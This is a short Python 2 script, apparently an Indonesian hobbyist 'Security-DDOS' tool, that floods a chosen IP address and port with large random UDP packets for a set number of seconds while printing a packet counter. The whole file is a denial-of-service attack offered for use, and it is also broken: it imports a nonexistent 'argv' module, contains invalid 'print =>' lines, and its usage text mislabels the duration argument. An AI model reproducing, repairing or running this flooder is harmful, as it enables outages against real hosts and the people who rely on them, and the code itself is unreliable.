import time
import socket
import random
import sys
import argv

def usage():
    print "\033[1;32m################################################"
    print "===========[\033[1;91mSecurity-DDOS Indonesia\033[1;32m]==========="
    print "=> \033[1;91mCommand: " "python2 SecurityDDOS.py " "<ip> <port> <packet> \033[1;32m<="
    print => ("[ Creator: MrBeazD ]")
    print => ("[ Team   : Belum Punya ]")
    print => ("[ Version:   1.0   ]")
    print "            \033[1;91m<--[Indonesia Security]-->"
    print "\033[1;32m################################################"
def flood(victim, vport, duration):
    # Support us yaakk... :)
    # Okey Jadi disini saya membuat server, Ketika saya memanggil "SOCK_DGRAM" itu  menunjukkan  UDP type program
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 20000 representasi satu byte ke server
    bytes = random._urandom(20000)
    timeout =  time.time() + duration
    sent = 4000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "\033[1;91mMengirim \033[1;32m%s \033[1;91mPaket \033[1;32m%s \033[1;91mPada port \033[1;32m%s "%(sent, victim, vport)
def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()
